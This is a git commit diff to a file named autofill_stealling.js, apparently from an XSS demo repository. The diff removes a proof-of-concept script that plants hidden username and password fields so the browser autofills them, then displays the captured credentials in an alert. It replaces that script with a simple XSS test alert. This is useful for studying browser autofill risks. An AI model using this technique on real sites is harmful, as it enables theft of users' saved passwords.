67cd894406d02b3e3ff72ba11388f2e64429ea13
vag4b0nd <117414789+RedEvilPanda@users.noreply.github.com>
2024-07-11 09:14:38 +0300

    Update autofill_stealling.js

--- autofill_stealling.js
+++ autofill_stealling.js
@@ -1,18 +1,1 @@
-const usernameEl = document.createElement('input');
-usernameEl.name = 'username';
-usernameEl.hidden = true;
-document.body.appendChild(usernameEl);
-
-const passwordEl = document.createElement('input');
-passwordEl.name = 'password';
-passwordEl.type = 'password';
-passwordEl.hidden = true;
-document.body.appendChild(passwordEl);
-
-window.addEventListener('click', () => {
-    if (passwordEl.value) {
-        alert(`Gotcha.\nUsername: ${usernameEl.value}\nPassword: ${passwordEl.value}`);
-    } else {
-        alert('Darn it, I couldn\'t get your password :(');
-    }
-});
+alert("XSS INCLUDE SCRIPT");
